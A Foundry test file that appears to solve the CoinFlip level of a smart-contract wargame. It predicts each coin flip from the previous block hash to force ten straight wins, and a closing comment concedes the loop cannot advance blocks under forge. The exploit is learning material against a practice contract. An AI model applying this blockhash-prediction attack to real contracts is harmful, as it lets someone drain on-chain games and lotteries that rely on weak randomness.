// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../contracts/utils/TestWithSetup.sol";
import "../contracts/3Coinflip.sol";

contract TestCoinFlip is TestWithSetup {
    CoinFlip public contractToTest;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    function setUp() public override {
        TestWithSetup.setUp();
        vm.prank(owner);
        contractToTest = new CoinFlip();
        vm.startPrank(user);
    }

    function testFlip() public {
        console2.log("current blocknumber: ", block.number);
        assertEq(contractToTest.consecutiveWins(), 0);
        while (contractToTest.consecutiveWins() < 10) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            if (lastHash == blockValue) {
                console2.log("waiting for next block...");
                continue;
            }
            uint256 coinFlip = blockValue / FACTOR;
            bool guess = coinFlip == 1 ? true : false;
            contractToTest.flip(guess);
            lastHash = blockValue;
        }
        assertEq(contractToTest.consecutiveWins(), 10);
    }
}

// note* run with  forge test --match-path test/3Coinflip.t.sol -vvvv --fork-url https://eth-mainnet.alchemyapi.io/v2/<api_key>
// but currently no way to mine next block or wait, so while loop can't be slowed, had to use hardahat test (**not chad at ALL!)
